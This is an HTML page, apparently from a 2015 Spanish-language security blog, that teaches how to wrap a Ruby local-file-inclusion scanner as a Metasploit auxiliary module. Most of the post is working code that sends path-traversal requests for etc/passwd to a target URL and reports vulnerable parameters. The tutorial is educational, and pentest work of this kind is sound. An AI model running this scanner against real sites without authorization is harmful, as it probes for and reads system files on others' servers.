@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Escribiendo Un Auxiliar Para MSF - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="&nbsp;By [Q]3rV[0]La idea de comenzar a aprender ruby llego solo por el echo de poder ver en la consola del msf un auxiliar escrito por mi. La &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/14/escribiendo-un-auxiliar-para-msf/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Escribiendo Un Auxiliar Para MSF</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T13:13:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:13 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/boJZ1iI.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/boJZ1iI.jpg" height="265" width="400" />&nbsp;</a></div><div class="separator" style="clear: both; text-align: right;"><b>By [Q]3rV[0]</b></div><div class="separator" style="clear: both; text-align: right;"><br /></div>La idea de comenzar a aprender ruby llego solo por el echo de poder  ver en la consola del msf un auxiliar escrito por mi. <br /><br />La Interfaz&nbspde&nbspProgramación&nbspde&nbspAplicaciones<span class="st"> (API)</span> de  metasploit no es muy complicadad de llevar y con solo unos dias de  practica, y es mas, ya estando familiarizados con otros lenguajes  similares como lo son python y perl la forma de tomar el control de ruby  se hace mas llevadera que comenzar desde cero. Por suspuesto no estoy  diciendo que sean realmente identicos pero ambos lenguajes poseen  ciertas caracteristicas como la sencilles de su sintaxis, entre otras.<br /><br />Durante este tutorial se mostrara paso a paso como aderir nuestra  herramienta escrita en ruby como modulo auxiliar de msf. Para ello  programe un sencillo scanner de LFI.<br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ #!/usr/bin/ruby  # Autor: [Q]3rV[0]  require 'net/http' require 'uri'  def conn(vector)    host=URI.parse(vector)    return Net::HTTP.get(host)  end  def compr(data, vector)          if data =~ /root:/             puts "Parametro vulnerable a LFI -> #{vector}\n"         else             puts "Not Found -> #{vector}\n"      end end  def lfi(web, pb, file)      a=0      while a<pb         a=a+1          traversal="../"*a+file         vector=web+traversal          data=conn(vector)          compr(data, vector)  end end  lfi(ARGV[0], ARGV[1].to_i, "etc/passwd") lfi(ARGV[0], ARGV[1].to_i, "etc/passwd")   ]]></script>Se le debera pasar como argumentos el parametro vulnerable y un numero que indicara la cantidad de ‘../’ que realizara la inyeccion.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/w3ALLIF.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/w3ALLIF.png" /></a></div><br />Lo primero que haremos sera importar el modulo msf/core y crer una clase en la cual heredaremos los metodos de Msf::Auxiliary.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary  end  ]]></script> Luego crearemos el metodo initialize que contendra dos funciones: super() y register_options().<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary      def initialize          super()          register_options() end  end  ]]></script> super() contendra la informacion de nuestro auxiliar, tales como la version, el nombre del autor, la descripcion del modulo, etc.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options()  end end  ]]></script> Por otro lado register_options() contendra las opciones del auxiliar, y es donde definiremos los argumentos para luego setearlos desde msf.  La funcion tomara dos argumentos.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ register_options([],self.class)  ]]></script> Dentro del array definiremos las opciones teniendo tipos como:<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ OptInt.new() # Para valores enteros OptString.new() # Para cadenas OptAddress.new() # Para direcciones  ]]></script> En nuestro caso quedaria de la siguiente maner:<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options([OptString.new('RHOST',[true, 'Indique el target']),                   OptInt.new('TRAVERSAL',[true, 'Path traversal'])], self.class)  end end  ]]></script> Fijense la sintaxis de Optxx.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ OptString.new('RHOST',[true, 'Indique el target'])  ]]></script> Recibe dos argumentos, el primero indica el nombre del parametro, el segundo es un array que contiene como primer indice un valor boleano que indica si es prescindible definir esa variable, y el segundo indice contiene la descripcion de la opcion.<br /><br />Bien, ahora pasemos a la parte donde hubicaremos el codigo del scanner.  Definiremos otro metodo llamado run() donde incluiremos el codigo.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core' require 'net/http' require 'uri'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options([OptString.new('RHOST',[true, 'Indique el target']),                   OptInt.new('TRAVERSAL',[true, 'Path traversal'])], self.class)  end      def run()          def conn(vector)          host=URI.parse(vector)          return Net::HTTP.get(host)      end      def compr(data, vector)          if data =~ /root:/             puts "Parametro vulnerable a LFI -> #{vector}\n"         else             puts "Not Found -> #{vector}\n"      end     end      def lfi(web, pb, file)          a=0          while a<pb             a=a+1              traversal="../"*a+file             vector=web+traversal              data=conn(vector)              compr(data, vector)          end         end      lfi(ARGV[0], ARGV[1].to_i, "etc/passwd")     lfi(ARGV[0], ARGV[1].to_i, "etc/passwd")      end  end   ]]></script> Pero todavia falta el pasaje de los argumentos y eso lo haremos con datastore[‘PARAMETRO’], donde PARAMETRO seran los antes definidos con Optxxx.new()  Quedando finalizado nuestro modulo auxiliar para Msf.<br /><br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ require 'msf/core' require 'net/http' require 'uri'  class Metasploit4 < Msf::Auxiliary      def initialize          super(         'Name' => 'LFI scanner',         'Version' => '1.0',         'Description' => 'Scanner para realizar inyecciones LFI',         'Author' => '[Q]3rV[0]',         'License'=> MSF_LICENSE          )          register_options([OptString.new('RHOST',[true, 'Indique el target']),                    OptInt.new('TRAVERSAL',[true, 'Path traversal'])], self.class)  end      def run()          def conn(vector)          host=URI.parse(vector)          return Net::HTTP.get(host)      end      def compr(data, vector)          if data =~ /root:/             puts "Parametro vulnerable a LFI -> #{vector}\n"         else             puts "Not Found -> #{vector}\n"      end     end      def lfi(web, pb, file)          a=0          while a<pb             a=a+1              traversal="../"*a+file             vector=web+traversal              data=conn(vector)              compr(data, vector)          end         end      lfi(datastore['RHOST'], datastore['TRAVERSAL'], "etc/passwd")     lfi(datastore['RHOST'], datastore['TRAVERSAL'], "etc/passwd")      end  end  ]]></script> Para terminar agregaremos el auxiliar a msf, crearemos un direcotorio en /opt/metasploit/apps/pro/msf3/modules/auxiliary y copiaremos nuestro script dentro.<br /><br />Luego accederemos a el.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/0ueSEgq.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/0ueSEgq.png" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/qL8scnG.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/qL8scnG.png" /></a></div><br /></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-14T13:13:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:13 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/14/escribiendo-un-auxiliar-para-msf/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/14/escribiendo-un-auxiliar-para-msf/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/14/desbordando-el-buffer-en-linux-x86-iii_14/" title="Previous Post: Desbordando El Buffer en Linux X86 (III)">&laquo; Desbordando El Buffer en Linux X86 (III)</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/15/xxe-injection-i/" title="Next Post: XXE Injection (I)">XXE Injection (I) &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
